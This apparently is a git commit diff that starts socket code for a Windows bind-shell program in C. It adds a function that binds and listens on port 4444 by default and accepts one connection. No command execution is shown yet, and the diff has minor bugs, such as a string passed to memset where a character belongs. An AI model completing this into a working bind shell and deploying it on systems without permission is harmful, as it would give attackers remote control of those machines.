c3d0093d9d91caee1389f4303752050e7864a80a
zriback <zacharythecdr@gmail.com>
2022-07-09 20:02:53 -0400

    Begin socket programming for the bind shell executable

--- src/shells/bindshell.c
+++ src/shells/bindshell.c
@@ -2,6 +2,15 @@
 #include <stdlib.h>
 #include <string.h>
 
+#include <windows.h>
+#include <winsock2.h>
+#include <ws2tcpip.h>
+
+// Need to link with Ws2_32.lib
+#pragma comment (lib, "Ws2_32.lib")
+
+
+
 // Two macros for stringizing s
 // More info at https://gcc.gnu.org/onlinedocs/cpp/Argument-Prescan.html#Argument-Prescan
 #define xstr(s) str(s)
@@ -10,13 +19,12 @@
 int port;
 char * ip;
 
-
-
+// more networking stuff
 
 int main(){
-    port = 4444;
+    port = 4444;  // default value
     ip = (char*)calloc(16, sizeof(char));
-    strcpy(ip, "192.168.1.1");
+    strcpy(ip, "192.168.1.1");  // default value
 
     #ifdef PORT
         port = PORT;
@@ -29,7 +37,59 @@ int main(){
     printf("Port: %d\n", port);
     printf("IP: %s\n", ip);
 
+    // startShell();
+
     free(ip);
 
     return 0;
+}
+
+/*
+Starts the shell
+Return values:
+    0 - exited normally/successfully
+    1 - exited with error
+*/
+int startShell() {
+    // initialize winsock
+    WSADATA wsData;
+    WORD version = MAKEWORD(2,2);
+    int wsock = WSAStartup(version, &wsData);
+    if ( wsock != 0) {
+        printf("Can't initialize winsock. Quitting...");
+        return 1;
+    }
+
+    // create a socket
+    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock == INVALID_SOCKET){
+        printf("Invalid socket. Quitting...");
+        return 1;
+    }
+
+    // bind socket to ip address and port
+    struct sockaddr_in hint; // a hint structure (?)
+    hint.sin_family = AF_INET;
+    hint.sin_port = htons(port);
+    hint.sin_addr.S_un.S_addr = INADDR_ANY; //same thing as the inet_pton line - tells to use any address
+    bind(sock, (struct sockaddr*)&hint, sizeof(hint));
+
+    // tell winsock the socker for meant to listen for incoming connections
+    listen(sock, SOMAXCONN);
+
+    // wait for a connection
+    struct sockaddr_in client;
+    int clientSize = sizeof(client);
+    SOCKET clientSocket = accept(sock, (struct sockaddr*)&client, &clientSize);
+
+    // the connected host's ip
+    char client_ip[NI_MAXHOST];
+    memset(client_ip, "\0", sizeof(client_ip));
+
+    inet_ntop(AF_INET, &client.sin_addr, client_ip, NI_MAXHOST);
+    printf("%s connected on port __(fill this in)", client_ip);
+
+    for (;;){
+        
+    }
 }
